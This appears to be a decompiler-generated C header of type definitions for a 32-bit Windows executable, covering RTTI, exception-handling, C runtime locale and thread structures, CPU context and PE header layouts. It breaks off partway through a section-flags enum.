typedef unsigned char   undefined;

typedef unsigned int    ImageBaseOffset32;
typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined3;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void * pVFTable;
    void * spare;
    char[0] name;
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor * pType;
    ptrdiff_t dispCatchObj;
    void * addressOfHandler;
};

typedef struct _s__RTTIBaseClassDescriptor _s__RTTIBaseClassDescriptor, *P_s__RTTIBaseClassDescriptor;

typedef struct _s__RTTIBaseClassDescriptor RTTIBaseClassDescriptor;

typedef struct PMD PMD, *PPMD;

typedef struct _s__RTTIClassHierarchyDescriptor _s__RTTIClassHierarchyDescriptor, *P_s__RTTIClassHierarchyDescriptor;

typedef struct _s__RTTIClassHierarchyDescriptor RTTIClassHierarchyDescriptor;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s__RTTIBaseClassDescriptor {
    struct TypeDescriptor * pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    dword numContainedBases; // count of extended classes in BaseClassArray (RTTI 2)
    struct PMD where; // member displacement structure
    dword attributes; // bit flags
    RTTIClassHierarchyDescriptor * pClassHierarchyDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3) for class
};

struct _s__RTTIClassHierarchyDescriptor {
    dword signature;
    dword attributes; // bit flags
    dword numBaseClasses; // number of base classes (i.e. rtti1Count)
    RTTIBaseClassDescriptor * * pBaseClassArray; // ref to BaseClassArray (RTTI 2)
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (* action)(void);
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

typedef struct _s_ESTypeList ESTypeList;

typedef struct _s_HandlerType HandlerType;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry * pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry * pTryBlockMap;
    uint nIPMapEntries;
    void * pIPToStateMap;
    ESTypeList * pESTypeList;
    int EHFlags;
};

struct _s_ESTypeList {
    int nCount;
    HandlerType * pTypeArray;
};

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType * pHandlerArray;
};

typedef unsigned short    wchar16;
typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Class Structure
};

typedef struct _s__RTTICompleteObjectLocator _s__RTTICompleteObjectLocator, *P_s__RTTICompleteObjectLocator;

typedef struct _s__RTTICompleteObjectLocator RTTICompleteObjectLocator;

struct _s__RTTICompleteObjectLocator {
    dword signature;
    dword offset; // offset of vbtable within class
    dword cdOffset; // constructor displacement offset
    struct TypeDescriptor * pTypeDescriptor; // ref to TypeDescriptor (RTTI 0) for class
    RTTIClassHierarchyDescriptor * pClassDescriptor; // ref to ClassHierarchyDescriptor (RTTI 3)
};

typedef struct _s_FuncInfo FuncInfo;

typedef struct _MEMORYSTATUSEX _MEMORYSTATUSEX, *P_MEMORYSTATUSEX;

typedef ulong DWORD;

typedef double ULONGLONG;

typedef ULONGLONG DWORDLONG;

struct _MEMORYSTATUSEX {
    DWORD dwLength;
    DWORD dwMemoryLoad;
    DWORDLONG ullTotalPhys;
    DWORDLONG ullAvailPhys;
    DWORDLONG ullTotalPageFile;
    DWORDLONG ullAvailPageFile;
    DWORDLONG ullTotalVirtual;
    DWORDLONG ullAvailVirtual;
    DWORDLONG ullAvailExtendedVirtual;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void * HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void * PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void * LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef wchar_t WCHAR;

typedef WCHAR * LPWSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE * LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW * LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION RTL_CRITICAL_SECTION;

typedef RTL_CRITICAL_SECTION CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG * PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * Flink;
    struct _LIST_ENTRY * Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION * CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _WIN32_FIND_DATAW * LPWIN32_FIND_DATAW;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

typedef struct _RTL_CRITICAL_SECTION * PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _OVERLAPPED * LPOVERLAPPED;

typedef struct _MEMORYSTATUSEX * LPMEMORYSTATUSEX;

typedef struct _SECURITY_ATTRIBUTES * LPSECURITY_ATTRIBUTES;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (* PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef DWORD ULONG;

typedef WCHAR OLECHAR;

typedef CRITICAL_SECTION _Rmtx;

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char * mantissa;
};

typedef struct _strflt * STRFLT;

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _Cvtvec _Cvtvec, *P_Cvtvec;

struct _Cvtvec {
    uint _Page;
    uint _Mbcurmax;
    int _Isclocale;
    uchar _Isleadbyte[32];
};

typedef struct _Ctypevec _Ctypevec, *P_Ctypevec;

struct _Ctypevec {
    uint _Page;
    short * _Table;
    int _Delfl;
    wchar_t * _LocaleName;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char * _ptr;
    int _cnt;
    char * _base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char * _tmpfname;
};

typedef struct _iobuf FILE;

typedef char * va_list;

typedef uint uintptr_t;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Class Structure
};

typedef struct _Iostream_error_category _Iostream_error_category, *P_Iostream_error_category;

struct _Iostream_error_category { // PlaceHolder Class Structure
};

typedef struct ios_base ios_base, *Pios_base;

struct ios_base { // PlaceHolder Class Structure
};

typedef struct error_category error_category, *Perror_category;

struct error_category { // PlaceHolder Class Structure
};

typedef struct _Generic_error_category _Generic_error_category, *P_Generic_error_category;

struct _Generic_error_category { // PlaceHolder Class Structure
};

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef ULONG_PTR KAFFINITY;

typedef struct tagLC_STRINGS tagLC_STRINGS, *PtagLC_STRINGS;

typedef struct tagLC_STRINGS * LPLC_STRINGS;

struct tagLC_STRINGS {
    wchar_t szLanguage[64];
    wchar_t szCountry[64];
    wchar_t szCodePage[16];
    wchar_t szLocaleName[85];
};

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef uint UINT;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t * pchLanguage;
    wchar_t * pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct * pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct * pthreadlocinfo;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

struct lconv {
    char * decimal_point;
    char * thousands_sep;
    char * grouping;
    char * int_curr_symbol;
    char * currency_symbol;
    char * mon_decimal_point;
    char * mon_thousands_sep;
    char * mon_grouping;
    char * positive_sign;
    char * negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t * _W_decimal_point;
    wchar_t * _W_thousands_sep;
    wchar_t * _W_int_curr_symbol;
    wchar_t * _W_currency_symbol;
    wchar_t * _W_mon_decimal_point;
    wchar_t * _W_mon_thousands_sep;
    wchar_t * _W_positive_sign;
    wchar_t * _W_negative_sign;
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t * mblocalename;
};

struct localerefcount {
    char * locale;
    wchar_t * wlocale;
    int * refcount;
    int * wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int * lconv_intl_refcount;
    int * lconv_num_refcount;
    int * lconv_mon_refcount;
    struct lconv * lconv;
    int * ctype1_refcount;
    ushort * ctype1;
    ushort * pctype;
    uchar * pclmap;
    uchar * pcumap;
    struct __lc_time_data * lc_time_curr;
    wchar_t * locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char * _token;
    wchar_t * _wtoken;
    uchar * _mtoken;
    char * _errmsg;
    wchar_t * _werrmsg;
    char * _namebuf0;
    wchar_t * _wnamebuf0;
    char * _namebuf1;
    wchar_t * _wnamebuf1;
    char * _asctimebuf;
    wchar_t * _wasctimebuf;
    void * _gmtimebuf;
    char * _cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void * _initaddr;
    void * _initarg;
    void * _pxcptacttab;
    void * _tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void * _terminate;
    void * _unexpected;
    void * _translator;
    void * _purecall;
    void * _curexception;
    void * _curcontext;
    int _ProcessingThrow;
    void * _curexcspec;
    void * _pFrameInfoChain;
    _setloc_struct _setloc_data;
    void * _reserved1;
    void * _reserved2;
    void * _reserved3;
    void * _reserved4;
    void * _reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char * wday_abbr[7];
    char * wday[7];
    char * month_abbr[12];
    char * month[12];
    char * ampm[2];
    char * ww_sdatefmt;
    char * ww_ldatefmt;
    char * ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t * _W_wday_abbr[7];
    wchar_t * _W_wday[7];
    wchar_t * _W_month_abbr[12];
    wchar_t * _W_month[12];
    wchar_t * _W_ampm[2];
    wchar_t * _W_ww_sdatefmt;
    wchar_t * _W_ww_ldatefmt;
    wchar_t * _W_ww_timefmt;
    wchar_t * _W_ww_locale_name;
};

typedef struct _tiddata * _ptiddata;

typedef dword unsigned_long;

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct unsigned_short unsigned_short, *Punsigned_short;

struct unsigned_short { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};


// WARNING! conflicting data type names: /Demangler/wchar_t - /wchar_t

typedef dword unsigned_char;

typedef dword unsigned___int64;

typedef dword unsigned_int;

typedef struct _Yarn<char> _Yarn<char>, *P_Yarn<char>;

struct _Yarn<char> { // PlaceHolder Structure
};

typedef struct _Lockit _Lockit, *P_Lockit;

struct _Lockit { // PlaceHolder Structure
};

typedef struct error_condition error_condition, *Perror_condition;

struct error_condition { // PlaceHolder Structure
};

typedef struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>, *Pbasic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>;

struct basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> { // PlaceHolder Structure
};

typedef struct _Mutex _Mutex, *P_Mutex;

struct _Mutex { // PlaceHolder Structure
};

typedef struct error_code error_code, *Perror_code;

struct error_code { // PlaceHolder Structure
};

typedef struct _Locinfo _Locinfo, *P_Locinfo;

struct _Locinfo { // PlaceHolder Structure
};

typedef struct _Locimp _Locimp, *P_Locimp;

struct _Locimp { // PlaceHolder Structure
};

typedef enum event {
} event;

typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef int (* _onexit_t)(void);

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo * LPCPINFO;

typedef DWORD LCTYPE;

typedef char CHAR;

typedef CHAR * LPSTR;

typedef BOOL (* LOCALE_ENUMPROCA)(LPSTR);

typedef struct tagSOLE_AUTHENTICATION_SERVICE tagSOLE_AUTHENTICATION_SERVICE, *PtagSOLE_AUTHENTICATION_SERVICE;

typedef struct tagSOLE_AUTHENTICATION_SERVICE SOLE_AUTHENTICATION_SERVICE;

typedef long HRESULT;

struct tagSOLE_AUTHENTICATION_SERVICE {
    DWORD dwAuthnSvc;
    DWORD dwAuthzSvc;
    OLECHAR * pPrincipalName;
    HRESULT hr;
};

typedef longlong fpos_t;

typedef ushort wint_t;

typedef uint size_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

typedef struct localeinfo_struct * _locale_t;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef size_t rsize_t;

typedef struct threadlocaleinfostruct threadlocinfo;

typedef int intptr_t;

typedef ushort wctype_t;

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef struct _GUID GUID;

typedef GUID IID;

typedef void * RPC_AUTH_IDENTITY_HANDLE;

typedef struct _PROCESSOR_RELATIONSHIP _PROCESSOR_RELATIONSHIP, *P_PROCESSOR_RELATIONSHIP;

typedef struct _PROCESSOR_RELATIONSHIP PROCESSOR_RELATIONSHIP;

typedef struct _GROUP_AFFINITY _GROUP_AFFINITY, *P_GROUP_AFFINITY;

typedef struct _GROUP_AFFINITY GROUP_AFFINITY;

struct _GROUP_AFFINITY {
    KAFFINITY Mask;
    WORD Group;
    WORD Reserved[3];
};

struct _PROCESSOR_RELATIONSHIP {
    BYTE Flags;
    BYTE Reserved[21];
    WORD GroupCount;
    GROUP_AFFINITY GroupMask[1];
};

typedef PVOID PSECURITY_DESCRIPTOR;

typedef enum _LOGICAL_PROCESSOR_RELATIONSHIP {
    RelationAll=65535,
    RelationCache=2,
    RelationGroup=4,
    RelationNumaNode=1,
    RelationProcessorCore=0,
    RelationProcessorPackage=3
} _LOGICAL_PROCESSOR_RELATIONSHIP;

typedef enum _LOGICAL_PROCESSOR_RELATIONSHIP LOGICAL_PROCESSOR_RELATIONSHIP;

typedef struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, *P_SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX;

typedef union _union_157 _union_157, *P_union_157;

typedef struct _NUMA_NODE_RELATIONSHIP _NUMA_NODE_RELATIONSHIP, *P_NUMA_NODE_RELATIONSHIP;

typedef struct _NUMA_NODE_RELATIONSHIP NUMA_NODE_RELATIONSHIP;

typedef struct _CACHE_RELATIONSHIP _CACHE_RELATIONSHIP, *P_CACHE_RELATIONSHIP;

typedef struct _CACHE_RELATIONSHIP CACHE_RELATIONSHIP;

typedef struct _GROUP_RELATIONSHIP _GROUP_RELATIONSHIP, *P_GROUP_RELATIONSHIP;

typedef struct _GROUP_RELATIONSHIP GROUP_RELATIONSHIP;

typedef enum _PROCESSOR_CACHE_TYPE {
    CacheData=2,
    CacheInstruction=1,
    CacheTrace=3,
    CacheUnified=0
} _PROCESSOR_CACHE_TYPE;

typedef enum _PROCESSOR_CACHE_TYPE PROCESSOR_CACHE_TYPE;

typedef struct _PROCESSOR_GROUP_INFO _PROCESSOR_GROUP_INFO, *P_PROCESSOR_GROUP_INFO;

typedef struct _PROCESSOR_GROUP_INFO PROCESSOR_GROUP_INFO;

struct _CACHE_RELATIONSHIP {
    BYTE Level;
    BYTE Associativity;
    WORD LineSize;
    DWORD CacheSize;
    PROCESSOR_CACHE_TYPE Type;
    BYTE Reserved[20];
    GROUP_AFFINITY GroupMask;
};

struct _PROCESSOR_GROUP_INFO {
    BYTE MaximumProcessorCount;
    BYTE ActiveProcessorCount;
    BYTE Reserved[38];
    KAFFINITY ActiveProcessorMask;
};

struct _NUMA_NODE_RELATIONSHIP {
    DWORD NodeNumber;
    BYTE Reserved[20];
    GROUP_AFFINITY GroupMask;
};

struct _GROUP_RELATIONSHIP {
    WORD MaximumGroupCount;
    WORD ActiveGroupCount;
    BYTE Reserved[20];
    PROCESSOR_GROUP_INFO GroupInfo[1];
};

union _union_157 {
    PROCESSOR_RELATIONSHIP Processor;
    NUMA_NODE_RELATIONSHIP NumaNode;
    CACHE_RELATIONSHIP Cache;
    GROUP_RELATIONSHIP Group;
};

struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX {
    LOGICAL_PROCESSOR_RELATIONSHIP Relationship;
    DWORD Size;
    union _union_157 u;
};

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX * PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX;

typedef enum _HEAP_INFORMATION_CLASS {
    HeapCompatibilityInformation=0,
    HeapEnableTerminationOnCorruption=1
} _HEAP_INFORMATION_CLASS;

typedef CHAR * LPCSTR;

typedef LONG * PLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef enum _HEAP_INFORMATION_CLASS HEAP_INFORMATION_CLASS;

typedef struct _IMAGE_SECTION_HEADER * PIMAGE_SECTION_HEADER;

typedef WCHAR * LPWCH;

typedef WCHAR * LPCWSTR;

typedef DWORD LCID;

typedef DWORD * LPDWORD;

typedef DWORD * PDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ * HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef struct _FILETIME * LPFILETIME;

typedef int (* FARPROC)(void);

typedef WORD * LPWORD;

typedef BOOL * LPBOOL;

typedef BYTE * PBYTE;

typedef void * LPCVOID;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
